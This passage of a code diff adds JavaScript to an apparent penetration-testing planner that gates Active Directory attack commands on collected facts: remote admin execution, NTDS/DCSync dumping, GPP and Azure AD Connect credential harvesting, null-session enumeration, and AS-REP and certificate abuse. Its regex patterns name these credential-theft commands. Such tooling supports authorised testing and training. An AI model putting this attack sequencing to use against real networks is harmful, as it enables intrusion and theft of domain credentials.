+            || facts.has('objective.root_flag')
+            || (!isSessionLauncher && facts.has('objective.flag_located_root'));
+          if (hasRoot) return true;
+          continue;
+        }
+        if (isLocal) {
+          var hasLocal = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.slot === 'local' && (!isSessionLauncher || v.on_host !== false); })
+            || facts.has('objective.local_flag')
+            || (!isSessionLauncher && facts.has('objective.flag_located_local'));
+          if (hasLocal) return true;
+          continue;
+        }
+        if (isSessionLauncher) {
+          var hasOnHostLoc = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.on_host !== false; });
+          if (hasOnHostLoc) return true;
+          continue;
+        }
+      }
+      if (s === 'ad.group_joined' && facts.has('ad.attack_paths')) {
+        var apVals = facts.values('ad.attack_paths') || [];
+        var joinedMap = {};
+        (facts.values('ad.group_joined') || []).forEach(function (jv) {
+          if (jv && jv.group) joinedMap[String(jv.group).split('@')[0].trim().toLowerCase()] = 1;
+        });
+        var groupHops = [];
+        for (var p = 0; p < apVals.length; p++) {
+          var hops = (apVals[p] && apVals[p].path) || [];
+          for (var h = 0; h < hops.length; h++) {
+            var hop = hops[h];
+            if (!hop || /^memberof$/i.test(String(hop.edge || ''))) continue;
+            var isGrp = /group/i.test(String(hop.to_kind || '')) || /^add(?:member|self)$/i.test(String(hop.edge || ''));
+            if (!isGrp && !hop.to_kind && hop.to && !/^getchanges/i.test(String(hop.edge || ''))) {
+              var shortTo = String(hop.to).split('@')[0].trim();
+              var domPart = String(hop.to).indexOf('@') >= 0 ? String(hop.to).split('@')[1].trim() : '';
+              if (shortTo && (!domPart || shortTo.toLowerCase() !== domPart.toLowerCase()) && shortTo.indexOf('.') < 0) isGrp = true;
+            }
+            if (isGrp && hop.to) groupHops.push(String(hop.to).split('@')[0].trim().toLowerCase());
+          }
+          if (groupHops.length || hops.length) break;
+        }
+        if (groupHops.length > 0) {
+          var allJoined = groupHops.every(function (gn) { return !!joinedMap[gn]; });
+          if (allJoined) return true;
+          continue;
+        }
+      }
+      if (facts.has(s)) return true;
+    }
+    return false;
+  }
+
+  function isTargetDomainController(facts) {
+    if (!facts || !facts.has) return false;
+    if (facts.has('ad.domain_controller') || facts.has('kerberos.reachable') || facts.has('port:88')) return true;
+    var tgt = (facts.context && facts.context.target) || (facts._resolvedContext && facts._resolvedContext.target) || '';
+    var hasPortScan = facts.has('ports.open') || facts.has('scan.nmap.quick') || facts.has('scan.nmap.version') || facts.has('scan.nmap.full');
+    if (Array.isArray(facts.facts)) {
+      var hostDcMatch = facts.facts.some(function (f) {
+        if (!f || f.state !== 'supported' || f.kind !== 'ad.dc_candidate') return false;
+        if (tgt && f.scope === 'host:' + tgt) return true;
+        if (tgt && f.value && f.value.ip) return f.value.ip === tgt;
+        return !hasPortScan && /^host:/i.test(f.scope || '');
+      });
+      if (hostDcMatch) return true;
+    }
+    if (hasPortScan) {
+      return facts.has('port:389') || facts.has('port:636') || facts.has('port:3268');
+    }
+    return facts.has('ad.dc_candidate');
+  }
+
+  // Evidence-based command gating: a command is ONLY eligible if its prerequisites are justified by facts.
+  function commandIsEligible(cmd, facts, action) {
+    if (!cmd) return false;
+    if (!facts) return true;
+    if (action && facts.forAction) facts = facts.forAction(action, cmd);
+
+    if (cmd.requires_admin) {
+      var hasAdmin = facts.has('access.admin') || facts.has('access.system')
+        || (commandExecutionLocus(cmd) === 'remote' && credentialProbeAllowed(action, facts));
+      if (!hasAdmin) return false;
+    }
+    if (cmd.requires_share) {
+      var hasShare = facts.has('smb.content_accessible') || facts.has('smb.readable_share') || facts.has('smb.shares');
+      if (!hasShare) return false;
+    }
+    if (cmd.requires_all && cmd.requires_all.length) {
+      for (var a = 0; a < cmd.requires_all.length; a++) {
+        if (!facts.has(cmd.requires_all[a])) return false;
+      }
+    }
+    if (cmd.requires_any && cmd.requires_any.length) {
+      var anyOk = false;
+      for (var y = 0; y < cmd.requires_any.length; y++) {
+        if (facts.has(cmd.requires_any[y])) { anyOk = true; break; }
+      }
+      if (!anyOk) return false;
+    }
+    if (cmd.requires_port) {
+      var reqPorts = Array.isArray(cmd.requires_port) ? cmd.requires_port : [cmd.requires_port];
+      var portOk = false;
+      for (var p = 0; p < reqPorts.length; p++) {
+        if (facts.has('port:' + reqPorts[p])) { portOk = true; break; }
+        if (root.OBOL && root.OBOL.command && root.OBOL.command.openPorts) {
+          if (root.OBOL.command.openPorts(facts).indexOf(reqPorts[p]) >= 0) { portOk = true; break; }
+        }
+      }
+      if (!portOk) return false;
+    }
+
+    // Inherent heuristics: commands requiring admin execution (nxc smb -x, wmiexec, psexec, smbexec)
+    var runStr = String(cmd.run || '');
+    if (/(?:^|\s)(?:--ntds|-just-dc|-just-dc-ntlm)\b/i.test(runStr)) {
+      var hasPortScanForNtds = facts.has('ports.open') || facts.has('scan.nmap.quick') || facts.has('scan.nmap.version') || facts.has('scan.nmap.full');
+      if (hasPortScanForNtds && !isTargetDomainController(facts)) return false;
+    }
+    if (/\bdiskshadow\b/i.test(runStr) && (!action || action.id !== 'sebackup-abuse')) {
+      var hasDcForDiskshadow = isTargetDomainController(facts) || facts.has('privesc.sebackup');
+      if (!hasDcForDiskshadow) return false;
+    }
+    if (/\bAzure-AD-Connect\.ps1\b/i.test(runStr) && (!action || action.id !== 'azuread-connect-dump')) {
+      if (!facts.has('service.adsync') && !facts.has('ad.azure_connect')) return false;
+    }
+    if (cmd.tool === 'evil-winrm' || (cmd.tool === 'nxc' && /\bwinrm\b/i.test(runStr) && (!action || action.id !== 'validate-credential'))) {
+      if (cmd.tool === 'evil-winrm') {
+        if (/(?:^|\s)-c\s+\{\{cert_file\}\}/i.test(runStr) && !facts.has('credential.certificate')) return false;
+        if (/(?:^|\s)-r\s+\{\{domain\}\}/i.test(runStr) && !/\s-u\b/i.test(runStr) && !facts.has('kerberos.tickets')) return false;
+      }
+      var hasWinrmPositive = facts.has('winrm.authenticated') || facts.has('access.admin') || facts.has('access.system') || facts.has('host.winrm_enabled');
+      if (!hasWinrmPositive && Array.isArray(facts.facts)) {
+        var winrmRefuted = facts.facts.some(function (f) {
+          if (!f || !f.value) return false;
+          var svc = String(f.value.service || '').toLowerCase();
+          if (svc !== 'winrm') return false;
+          return (f.kind === 'credential.validation' && (f.state === 'refuted' || f.value.outcome === 'rejected'))
+            || (f.kind === 'blocker.logon_failure' && f.state === 'supported');
+        });
+        if (winrmRefuted) return false;
+      }
+    }
+    if ((cmd.tool === 'nxc' && (runStr.indexOf('smb ') >= 0 || runStr.indexOf('wmi ') >= 0) && /\s-[xX]\s/.test(runStr)) || cmd.tool === 'impacket-psexec' || cmd.tool === 'impacket-wmiexec' || cmd.tool === 'impacket-smbexec') {
+      var hasAdm = facts.has('access.admin') || facts.has('access.system');
+      if (!hasAdm && !(commandExecutionLocus(cmd) === 'remote' && credentialProbeAllowed(action, facts))) return false;
+    }
+    // Inherent heuristics: hardcoded /Users or --spider Users require evidence of accessible share
+    if (runStr.indexOf('/Users') >= 0 || runStr.indexOf('--spider Users') >= 0) {
+      var hasSh = facts.has('smb.content_accessible') || facts.has('smb.readable_share') || facts.has('smb.shares');
+      if (!hasSh) return false;
+    }
+    // NetExec's -M gpp_password hardcodes SYSVOL and ignores custom readable shares (e.g. Replication).
+    // Once SMB shares have been enumerated, suppress -M gpp_password if SYSVOL is not readable.
+    if (/-M\s+gpp_password\b/i.test(runStr) && (facts.has('smb.shares') || facts.has('smb.readable_share'))) {
+      var sysvolReadable = (facts.values('smb.readable_share') || []).some(function (v) {
+        return v && String(v.name || '').toUpperCase() === 'SYSVOL';
+      }) || (facts.values('smb.shares') || []).some(function (v) {
+        return ((v && v.shares) || []).some(function (s) {
+          return s && String(s.name || '').toUpperCase() === 'SYSVOL' && (s.readable === true || (s.permission && s.permission.indexOf('READ') >= 0));
+        });
+      });
+      if (!sysvolReadable) {
+        var isUnauthGpp = /(?:^|\s)-u\s*(?:''|"")(?:\s|$)/i.test(runStr);
+        if (isUnauthGpp || (!facts.has('credential.available') && !facts.has('smb.authenticated'))) {
+          return false;
+        }
+        var hasCustomReadable = (facts.values('smb.readable_share') || []).some(function (v) {
+          return v && v.name && String(v.name).toUpperCase() !== 'SYSVOL';
+        });
+        if (hasCustomReadable) return false;
+      }
+    }
+    // When unauthenticated SAMR/LSARPC user/RID enumeration is proven denied over null session,
+    // suppress remaining unauthenticated SAMR/RID commands until a credential is available.
+    if (facts.has('blocker.samr_null_denied') && !facts.has('credential.available') && !facts.has('smb.authenticated')) {
+      var isUnauthSamrCmd = ((/(?:^|\s)-(?:u|U)\s*(?:''|""|%)(?:\s|$)|\blookupsid(?:\.py)?\s+(?:guest|anonymous)@/i.test(runStr))
+        && (/--rid-brute|--users|\benumdomusers\b|\blookupsid/i.test(runStr)))
+        || /^\s*enum4linux(?:-ng)?\s+-(?:U|A|a)\b/i.test(runStr);
+      if (isUnauthSamrCmd) return false;
+    }
+    // In-session on-host commands (cmd, powershell, sh, Rubeus, SharpHound, etc.) require an established
+    // on-host session or administrative execution rights whenever the move offers remote alternatives.
+    // Exception: on flag-hunt cards, keep Step 2 on-host flag dump commands eligible alongside Step 1
+    // (evil-winrm / ssh / wmiexec) so the operator can see and copy both Step 1 and Step 2 at once.
+    if (commandExecutionLocus(cmd) === 'onhost' && cmd.locus !== 'remote' && !isFlagHuntAction(action)) {
+      var hasShellOrAdmin = facts.has('foothold.windows') || facts.has('foothold.linux') || facts.has('foothold.webshell')
+        || facts.has('access.shell') || facts.has('access.admin_shell') || facts.has('access.desktop')
+        || facts.has('winrm.authenticated') || facts.has('rdp.authenticated') || facts.has('ssh.authenticated')
+        || facts.has('access.admin') || facts.has('access.system') || facts.has('access.root')
+        || credentialProbeAllowed(action, facts);
+      if (!hasShellOrAdmin) {
+        var actionHasRemoteAlt = !action || ((action.commands || []).some(function (c) {
+          return commandExecutionLocus(c) === 'remote';
+        }));
+        if (actionHasRemoteAlt) return false;
+      }
+    }
+    if (cmd.local_auth_fallback) {
+      var isHostDc = facts.has('ad.domain_controller') || facts.has('kerberos.reachable') || facts.has('port:88')
+        || (Array.isArray(facts.facts) && facts.facts.some(function (f) {
+          return f && f.state === 'supported' && f.kind === 'ad.dc_candidate' && /^host:/i.test(f.scope || '');
+        }));
+      if (isHostDc) {
+        return false;
+      }
+      var rcLocal = facts._resolvedContext;
+      var tDom = String((rcLocal && rcLocal.targetDomain) || '').trim();
+      var hasAdDom = (tDom.indexOf('.') > 0 && tDom.toLowerCase() !== 'workgroup')
+        || facts.has('ad.domain_known')
+        || ((facts.values && facts.values('host.domain')) || []).some(function (v) {
+          var dn = String((v && (v.domain || v.name)) || '').trim();
+          return dn.indexOf('.') > 0 && dn.toLowerCase() !== 'workgroup';
+        });
+      if (!hasAdDom) return false;
+      var boundLocalCred = rcLocal && rcLocal.credential;
+      var isBareOrAdminLocal = !!(boundLocalCred && (!boundLocalCred.domain || boundLocalCred.accountType === 'local' || /^(?:administrator|admin)$/i.test(String(boundLocalCred.user || ''))));
+      var hasHostHint = !!(boundLocalCred && (boundLocalCred.forHost || boundLocalCred.accountType === 'local')) || isBareOrAdminLocal;
+      var domainAuthRejected = hasHostHint || facts.has('blocker.logon_failure');
+      if (!domainAuthRejected && rcLocal && rcLocal.engagement && Array.isArray(rcLocal.engagement.activities)) {
+        var cId = rcLocal.credentialId;
+        var tgtHost = rcLocal.target || '';
+        domainAuthRejected = rcLocal.engagement.activities.some(function (act) {
+          if (!act || !act.outcome || !act.outcome.conclusive || act.outcome.kind !== 'rejected') return false;
+          var actTgt = act.target || (/^host:/.test(act.scope || '') ? act.scope.slice(5) : '');
+          if (tgtHost && actTgt && actTgt !== tgtHost) return false;
+          var actCmd = String(act.command || act.dispatch || '');
+          if (/(?:^|\s)--local-auth\b/i.test(actCmd) || !/\b(?:nxc|netexec|crackmapexec|cme)\s+smb\b/i.test(actCmd)) return false;
+          var pc = act.context || (act.outcome && act.outcome.context) || {};
+          return !cId || !pc.credentialId || pc.credentialId === cId;
+        });
+      }
+      if (!domainAuthRejected) return false;
+    }
+    if (root.OBOL && root.OBOL.command && root.OBOL.command.commandPortFeasible) {
+      var checkPortFeasible = (action && action.id === 'validate-credential')
+        || (commandLocus(cmd) === 'remote' && (!/\{\{(?:dc_ip|dc|dc_fqdn|internal_host|pivot_host)\}\}/.test(runStr) || /\{\{target\}\}/.test(runStr)));
+      if (checkPortFeasible && root.OBOL.command.commandPortFeasible(cmd, facts).feasible === false) return false;
+    }
+    if (action && action.id === 'validate-credential') {
+      var rcVal = facts._resolvedContext;
+      var boundCred = rcVal && rcVal.credential;
+      var availVals = (facts.values && facts.values('credential.available')) || [];
+      var hasPw = boundCred ? !!boundCred.password : availVals.some(function (v) { return !!(v && (v.password || v.secret)); });
+      var hasNt = boundCred ? !!boundCred.nthash : availVals.some(function (v) { return !!(v && (v.nthash || v.hash)); });
+      if (boundCred || availVals.length > 0) {
+        if (runStr.indexOf('{{nthash}}') >= 0 && runStr.indexOf('{{password}}') < 0 && !hasNt) return false;
+        if (runStr.indexOf('{{password}}') >= 0 && runStr.indexOf('{{nthash}}') < 0 && !hasPw) return false;
+        if (/\b(?:nxc|netexec|crackmapexec|cme)\s+(?:ssh|ftp)\b/i.test(runStr) && !hasPw) return false;
+      }
+    }
+
+    return true;
+  }
+
+  // The default command index for a move at a given locus: among commands matching the locus, not yet
+  // settled, and not skipped (skipFn lets the UI exclude commands gated on facts the operator has not
+  // earned yet), prefer the house toolkit (nxc), then a switchless probe, then earliest pack order. Falls
+  // back to the first locus-matching command (even if settled/gated) so the toggle always has a target.
+  function preferredCommandIndex(move, locus, facts, skipFn, triedFn) {
+    if (OBOL.pack && OBOL.pack._cloudPreferredCommandIndex) {
+      return OBOL.pack._cloudPreferredCommandIndex(move, locus, facts, skipFn, triedFn);
+    }
+    return 0;
+  }
+  function moveToolkitRank(move) {
+    var cs = (move && move.commands) || [];
+    for (var i = 0; i < cs.length; i++) if (commandToolkitRank(cs[i]) === 0) return 0;
+    return 1;
+  }
+
+  // scope - where a technique sits in the OSCP syllabus, for a newcomer-safe lens:
+  //   'oscp' core exam material · 'oscp+' modern AD past the core · 'beyond' exotic / legacy / edge CVEs.
+  // Default is 'oscp'; a move escalates only when its id, tool, or an earned gate fact matches a curated
+  // signal. Curated (not auto-derived) because syllabus placement is a judgment call, overridable via d.scope.
+  var SCOPE_BEYOND_IDS = { 'nopac': 1, 'printnightmare': 1, 'ms14-068': 1, 'zerologon': 1, 'zerologon-exploit': 1 };
+  var SCOPE_BEYOND_TOOLS = { 'zerologon-scan': 1, sharpwsus: 1, sharpsccm: 1, sccmhunter: 1 };
+  var SCOPE_BEYOND_FACTS = { 'ad.zerologon': 1, 'ad.sid_history': 1 };
+  var SCOPE_PLUS_TOOLS = { certipy: 1, pywhisker: 1, ntlmrelayx: 1, responder: 1, coercer: 1, mitm6: 1,
+    'impacket-ticketer': 1, 'impacket-rbcd': 1, 'impacket-getst': 1,
+    'petitpotam.py': 1, 'printerbug.py': 1, 'dfscoerce.py': 1, targetedkerberoast: 1 };
+  // Note: credential.certificate is deliberately NOT a plus-fact - it is overloaded (an ADCS cert in AD,
+  // but also a bare SSH key for ssh-key-login, which is core). ADCS is caught by the certipy tool + the
+  // adcs.vulnerable gate instead. Likewise the id regex uses `shadow-cred`, not a bare `shadow`, so that
+  // crack-shadow (cracking /etc/shadow - core OSCP) is not mistaken for the shadow-credentials attack.
+  // Core PEN-200 / OSCP fundamentals (dcsync, bloodyad-acl, ad-acl-abuse, gmsa-read, gpo-abuse,
+  // windows-service-dacl-abuse, smtp-open-relay) stay in core 'oscp'.
+  var SCOPE_PLUS_FACTS = { 'adcs.vulnerable': 1, 'ad.coerced_auth': 1, 'ad.unconstrained': 1,
+    'hash.krbtgt': 1, 'relay.success': 1 };
+  var SCOPE_PLUS_ID_RE = /deleg|shadow-cred|rbcd|golden|silver|(?:ntlm|kerberos)-relay|relay-target|coerce|unconstrained|constrained/;
+  function deriveScope(d) {
+    if (d.scope) return d.scope;
+    var id = String(d.id || '').toLowerCase();
+    // Key the tool signal on the PRIMARY tool only - a secondary tool in the array (e.g. targetedKerberoast
+    // listed alongside the standard GetUserSPNs Kerberoast) must not escalate an otherwise-core move.
+    var primary = String((d.tool || (d.tools && d.tools[0]) || '')).toLowerCase();
+    var reqAll = d.requires_all || [];
+    var reqAny = d.requires_any || [];
+    function hasGate(map) {
+      return reqAll.some(function (g) { return map[g]; }) ||
+        (reqAny.length > 0 && reqAny.every(function (g) { return map[g]; }));
+    }
+    if (SCOPE_BEYOND_IDS[id] || SCOPE_BEYOND_TOOLS[primary] || hasGate(SCOPE_BEYOND_FACTS)) return 'beyond';
+    if (SCOPE_PLUS_ID_RE.test(id) || SCOPE_PLUS_TOOLS[primary] || hasGate(SCOPE_PLUS_FACTS)) return 'oscp+';
+    return 'oscp';
+  }
+  function locusRank(l) { return l === 'R' ? 0 : (l === 'F' ? 1 : 2); }
+
+  // ------------------------------------------------------------------ Action --
+  function Action(d) {
+    d = d || {};
+    var cmds = d.commands || [];
+    this.id = d.id;
+    this.title = d.title || d.id;
+    this.tool = d.tool || '';
+    this.command = cmds.length ? cmds[0].run : (d.command || '');
+    this.proves = d.proves || '';
+    this.does_not_prove = d.does_not_prove || '';
+    this.priority = parseInt(d.priority != null ? d.priority : 50, 10);
+    this.phase = d.phase || '';
+    this.autonomy = d.autonomy || '';
+    this.requires_all = (d.requires_all || []).slice();
+    this.requires_any = (d.requires_any || []).slice();
+    this.credential_probe = d.credential_probe || null;
+    this.obsoleted_by = (d.obsoleted_by || []).slice();
+    this.deprioritize_when = (d.deprioritize_when || []).slice();
+    this.produces = (d.produces || []).slice();
+    this.hypothesis = d.hypothesis || '';
+    this.tools = (d.tools || []).slice();
+    this.os = (d.os || []).slice();
+    this.report = d.report || null;
+    this.refs = (d.refs || []).slice();
+    this.commands = cmds.slice();
+    this.field_notes = Array.isArray(d.field_notes) ? d.field_notes.slice() : null;
+    if (this.field_notes && this.id) {
+      OBOL.FIELD_NOTES = OBOL.FIELD_NOTES || {};
+      OBOL.FIELD_NOTES[this.id] = this.field_notes.slice();
+    }
+    this.sequence = !!d.sequence;
+    this.stepper = !!d.stepper;
+    // Explore-vs-Exploit: a DIAGNOSTIC move is a high-information opener that
+    // collapses the search tree (a service scan, an AD orient, an SMB-anon or
+    // web-stack probe). In the opening (explore mode) these lead, as data rather
+    // than a per-move weight. `eliminates` names the uncertainty it rules in/out
+    // (authored metadata; the ranker tiebreak keys on the boolean).
+    this.diagnostic = !!d.diagnostic;
+    this.eliminates = (d.eliminates || []).slice();
+    // Kill-chain role for the state-transition bonuses in nextActionsV2. Authored
+    // as DATA so a bonus keys on the move's role, not a fragile `id === '...'`
+    // string that silently stops matching if the move is ever renamed. Values:
+    //   crack / crack_tgs / crack_asrep · dcsync · privesc_act · foothold_win ·
+    //   root_flag_win / user_flag_win · loot_browse · gpp · kerberoast ·
+    //   map_acl / map_graph / map_manual.
+    this.transition = d.transition || '';
+    // A generic, non-AD-specific fallback (host LPE / tunnel) that must not
+    // leapfrog the AD attack chain on an un-mapped Domain Controller. Authored as
+    // data so the anti-thrash rule keys on the role, not a hardcoded id list.
+    this.dcDefer = !!d.dcDefer;
+    // A "try-if-vulnerable" move (an unconfirmed named-vuln check, coerce/relay,
+    // open-relay probe): minted as a gamble, it must not outrank an evidenced
+    // next step. Authored as data in place of the old id-name regex so a move's
+    // speculative status travels with it rather than depending on its id spelling.
+    this.speculative = !!d.speculative;
+    this.timeout = parseInt(d.timeout || 0, 10) || 0;
+    this.locus = deriveLocus(d);   // 'R' remote/offline · 'F' one-shot on-host · 'I' interactive on-host
+    this.scope = deriveScope(d);   // 'oscp' · 'oscp+' · 'beyond' (newcomer-safe lens)
+  }
+
+  Action.prototype.producedKinds = function () { return new Set(this.produces); };
+
+  var GUIDED_SEQUENCE_IDS = {
+    'pivot-ligolo': 1,
+    'pivot-chisel-socks': 1,
+    'dns-tunnel': 1,
+    'jdwp-local-privesc': 1
+  };
+  function isGuidedSequenceMove(action) {
+    if (!action) return false;
+    if (action.stepper) return true;
+    return !!(action.sequence && GUIDED_SEQUENCE_IDS[action.id]);
+  }
+
+  var AUX_PRODUCED_RE = /^advice\.|^persistence\.|^listener\.|^tunnel\.|^enum\.deep$|^kerberos\.tickets$|^host\.kernel$|^host\.arch$|^host\.multihomed$/;
+  var GENERIC_MULTI_KINDS = {
+    'credential.available': 1, 'credential.plaintext': 1, 'credential.candidate': 1,
+    'loot.files': 1, 'loot.material': 1, 'config.review': 1
+  };
+  var GENERIC_CRED_ONLY_KINDS = {
+    'credential.available': 1, 'credential.plaintext': 1, 'credential.candidate': 1
+  };
+
+  function extractLoopbackDbPorts(factList) {
+    var hasAccess = false, i, f, k;
+    if (!Array.isArray(factList)) return null;
+    for (i = 0; i < factList.length; i++) {
+      f = factList[i];
+      if (!f || (f.state && f.state !== 'supported')) continue;
+      k = f.kind || '';
+      if (k === 'foothold.linux' || k === 'foothold.windows' || k === 'pivot.ports') {
+        hasAccess = true;
+        break;
+      }
+    }
+    if (!hasAccess) return null;
+    var found = null;
+    for (i = 0; i < factList.length; i++) {
+      f = factList[i];
+      if (!f || (f.state && f.state !== 'supported')) continue;
+      k = f.kind || '';
+      if (k !== 'scan.local.listeners' && k !== 'pivot.ports') continue;
+      var v = f.value || {};
+      var arr = Array.isArray(v.ports) ? v.ports : [];
+      for (var j = 0; j < arr.length; j++) {
+        var pn = parseInt(arr[j] && typeof arr[j] === 'object' ? arr[j].port : arr[j], 10);
+        if (pn === 3306 || pn === 5432) {
+          if (!found) found = {};
+          found[pn] = true;
+        }
+      }
+      if (Array.isArray(v.forwards)) {
+        for (var fw = 0; fw < v.forwards.length; fw++) {
+          var fwo = v.forwards[fw] || {};
+          var fwp = parseInt(fwo.rport || fwo.remotePort || fwo.port, 10);
+          if (fwp === 3306 || fwp === 5432) {
+            if (!found) found = {};
+            found[fwp] = true;
+          }
+        }
+      }
+      var sp = parseInt(v.port, 10);
+      if (sp === 3306 || sp === 5432) {
+        if (!found) found = {};
+        found[sp] = true;
+      }
+    }
+    return found;
+  }
+
+  function augmentProjectedKinds(facts, baseHave) {
+    if (!baseHave || !facts) return baseHave;
+    var out = baseHave, cloned = false;
+    function ensureClone() {
+      if (!cloned) {
+        var c = {};
+        for (var bk in baseHave) c[bk] = baseHave[bk];
+        out = c;
+        cloned = true;
+      }
+    }
+    if ((baseHave['port:88'] || baseHave['ad.dc_candidate']) && !baseHave['kerberos.reachable']) {
+      ensureClone();
+      out['kerberos.reachable'] = 1;
+    }
+    if (baseHave['foothold.linux'] || baseHave['foothold.windows'] || baseHave['pivot.ports']) {
+      var fl = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
+        ? facts._resolvedContext.allScopedFacts
+        : (Array.isArray(facts.facts) ? facts.facts : null);
+      var lbp = extractLoopbackDbPorts(fl);
+      if (lbp) {
+        if (lbp[3306] && (!out['port:3306'] || !out['service.mysql'])) {
+          ensureClone();
+          out['port:3306'] = 1;
+          out['service.mysql'] = 1;
+        }
+        if (lbp[5432] && (!out['port:5432'] || !out['service.postgresql'])) {
+          ensureClone();
+          out['port:5432'] = 1;
+          out['service.postgresql'] = 1;
+        }
+      }
+    }
+    return out;
+  }
+
+  function hasUncrackedAsrep(facts) {
+    if (!facts) return false;
+    var list = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
+      ? facts._resolvedContext.allScopedFacts
+      : (Array.isArray(facts.facts) ? facts.facts : []);
+    var sawAsrep = false, asrepUsers = [], seenAsrepU = Object.create(null);
+    var crackedUsers = Object.create(null), hasAnyCrackedAsrepMethod = false;
+    function normPrincipal(raw) {
+      var s = String(raw || '').trim();
+      if (!s) return '';
+      s = s.replace(/^.*\\/, '').split('@')[0].trim().toLowerCase();
+      return s;
+    }
+    for (var i = 0; i < list.length; i++) {
+      var f = list[i];
+      if (!f || (f.state && f.state !== 'supported')) continue;
+      var v = f.value || {};
+      if (f.kind === 'hash.asrep') {
+        sawAsrep = true;
+        var uCandidates = [];
+        if (v.user) uCandidates.push(v.user);
+        if (v.principal) uCandidates.push(v.principal);
+        if (Array.isArray(v.users)) {
+          for (var ui = 0; ui < v.users.length; ui++) uCandidates.push(v.users[ui]);
+        }
+        var hList = Array.isArray(v.hashes) ? v.hashes : (v.hash ? [v.hash] : []);
+        for (var hi = 0; hi < hList.length; hi++) {
+          var hm = /\$krb5asrep\$(?:\d+\$)?\*?([^$:@\s]+)(?:[$@:][^\s]*)?/i.exec(String(hList[hi] || ''));
+          if (hm && hm[1]) uCandidates.push(hm[1]);
+        }
+        for (var ci = 0; ci < uCandidates.length; ci++) {
+          var nu = normPrincipal(uCandidates[ci]);
+          if (nu && !seenAsrepU[nu]) {
+            seenAsrepU[nu] = 1;
+            asrepUsers.push(nu);
+          }
+        }
+      } else if (f.kind === 'credential.available' || f.kind === 'credential.plaintext') {
+        var hasSecret = !!(v.password || v.secret);
+        var cu = normPrincipal(v.user || v.username || v.principal);
+        if (hasSecret && cu) crackedUsers[cu] = 1;
+        var meth = String(v.method || '').toLowerCase();
+        var ht = String(v.hash_type || '').toLowerCase();
+        if (hasSecret && (meth.indexOf('crack') >= 0 || meth.indexOf('hashcat') >= 0 || meth.indexOf('john') >= 0) && (!ht || ht === 'asrep' || ht === 'krb5asrep')) {
+          hasAnyCrackedAsrepMethod = true;
+        }
+      }
+    }
+    if (!sawAsrep) return false;
+    if (asrepUsers.length > 0) {
+      for (var aui = 0; aui < asrepUsers.length; aui++) {
+        if (!crackedUsers[asrepUsers[aui]]) return true;
+      }
+      return false;
+    }
+    return !hasAnyCrackedAsrepMethod && Object.keys(crackedUsers).length === 0;
+  }
+
+  function hasUnauthenticatedCert(facts) {
+    if (!facts) return false;
+    var list = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
+      ? facts._resolvedContext.allScopedFacts
+      : (Array.isArray(facts.facts) ? facts.facts : []);
+    var sawCert = false, certUsers = [], seenCertU = Object.create(null);
+    var authedUsers = Object.create(null), hasCertDerivedAuth = false;
+    function normU(raw) {
+      var s = String(raw || '').trim();
+      if (!s) return '';
+      s = s.replace(/^CN=/i, '').replace(/,.*$/, '').replace(/^.*\\/, '').split('@')[0].trim().toLowerCase();
+      return s;
+    }
+    for (var i = 0; i < list.length; i++) {
+      var f = list[i];
+      if (!f || (f.state && f.state !== 'supported')) continue;
+      var v = f.value || {};
+      if (f.kind === 'credential.certificate') {
+        sawCert = true;
+        var cu = normU(v.user || v.upn || v.principal || v.subject || v.account);
+        if (cu && !seenCertU[cu]) {
+          seenCertU[cu] = 1;
+          certUsers.push(cu);
+        }
+      } else if (f.kind === 'credential.available' || f.kind === 'credential.validated' || f.kind === 'kerberos.tickets' || /\.authenticated$/.test(f.kind || '')) {
+        var au = normU(v.user || v.username || v.principal || v.impersonate);
+        var hasAuthMat = f.kind === 'credential.validated' || f.kind === 'kerberos.tickets' || /\.authenticated$/.test(f.kind || '') || !!(v.nthash || v.hash || v.password || v.secret);
+        if (au && hasAuthMat) authedUsers[au] = 1;
+        var srcStr = String(v.method || v.via || v.tool || f.source || '').toLowerCase();
+        if (hasAuthMat && /certipy|pkinit|gettgtpkinit|certificate/.test(srcStr)) hasCertDerivedAuth = true;
+      }
+    }
+    if (!sawCert) return false;
+    if (certUsers.length > 0) {
+      for (var cui = 0; cui < certUsers.length; cui++) {
+        if (!authedUsers[certUsers[cui]]) return true;
+      }
+      return false;
+    }
+    return !hasCertDerivedAuth;
+  }
+
+  function canUseFastHave(facts, preHave) {
+    return !!(preHave && facts && root.OBOL && root.OBOL.facts && root.OBOL.facts.FactSet
+      && facts.has === root.OBOL.facts.FactSet.prototype.has
+      && facts.kinds === root.OBOL.facts.FactSet.prototype.kinds);
+  }
+  var _resolvedFactsCache = typeof WeakMap === 'function' ? new WeakMap() : null;
+  function getResolvedFactsMemo(facts) {
+    if (!_resolvedFactsCache || !facts || !facts._resolvedContext || !Array.isArray(facts.facts)) return null;
+    if (!(root.OBOL && root.OBOL.facts && root.OBOL.facts.FactSet
+      && facts.has === root.OBOL.facts.FactSet.prototype.has
+      && facts.kinds === root.OBOL.facts.FactSet.prototype.kinds)) return null;
+    var fLen = facts.facts.length;
+    var scLen = Array.isArray(facts.state_changed) ? facts.state_changed.length : 0;
+    var eng = facts._resolvedContext.engagement;
+    var aLen = (eng && Array.isArray(eng.activities)) ? eng.activities.length : -1;
+    var entry = _resolvedFactsCache.get(facts);
+    if (!entry || entry.fLen !== fLen || entry.scLen !== scLen || entry.aLen !== aLen) {
+      var proj = (scLen === 0 && facts._projBase && Array.isArray(facts._projBase.facts) && facts._projBase.facts.length === fLen)
+        ? facts._projBase : null;
+      var projMemo = proj ? _resolvedFactsCache.get(proj) : null;
+      if (proj && (!projMemo || projMemo.fLen !== fLen)) {
+        projMemo = {
+          fLen: fLen,
+          have: augmentProjectedKinds(proj, proj.kinds()),
+          fam: hostOsFamily(proj)
+        };
+        _resolvedFactsCache.set(proj, projMemo);
+      }
+      entry = {
+        fLen: fLen,
+        scLen: scLen,
+        aLen: aLen,
+        have: projMemo ? projMemo.have : augmentProjectedKinds(facts, facts.kinds()),
+        fam: projMemo ? projMemo.fam : hostOsFamily(facts),
+        elig: new WeakMap(),
+        settled: new WeakMap()
+      };
+      _resolvedFactsCache.set(facts, entry);
+    }
+    return entry;
+  }
+
+  function actionMayMatchCompletedActivity(action, facts) {
+    var rc = facts && facts._resolvedContext;
+    var frameInfos = rc && rc._frame && rc._frame.retirableActInfos;
+    if (Array.isArray(frameInfos)) {
+      if (!frameInfos.length) return false;
+      var fMeta = v2GetActionMeta(action);
